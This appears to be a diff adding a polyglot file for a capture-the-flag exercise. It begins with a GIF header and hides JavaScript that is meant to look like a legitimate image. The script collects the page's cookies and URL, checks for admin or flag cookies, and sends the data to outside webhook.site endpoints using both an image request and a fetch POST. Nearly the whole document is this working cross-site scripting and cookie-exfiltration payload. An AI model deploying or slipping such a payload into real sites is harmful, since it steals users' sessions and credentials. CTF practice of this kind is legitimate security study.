@@ -1,0 +1,30 @@
+GIF89a;
+<!--
+Multi-method XSS payload for Gallery CTF
+This GIF appears legitimate but contains JavaScript
+-->
+<script>
+// Gallery XSS - Hidden in GIF comment
+(function() {
+    var payload = {
+        type: 'gallery_gif_xss',
+        cookies: document.cookie,
+        url: location.href,
+        timestamp: Date.now(),
+        admin_check: document.cookie.includes('admin') || document.cookie.includes('flag')
+    };
+    
+    // Exfiltrate to webhook
+    new Image().src = 'https://webhook.site/c0f19732-67ad-4534-bf00-cfd34c46e83e?gif_payload=' + 
+                     btoa(JSON.stringify(payload));
+    
+    // Also try fetch for modern browsers
+    if (window.fetch) {
+        fetch('https://webhook.site/19178815-ab5f-44c5-b8bc-078fecab6190', {
+            method: 'POST',
+            body: JSON.stringify(payload)
+        }).catch(() => {});
+    }
+})();
+</script>
+-->
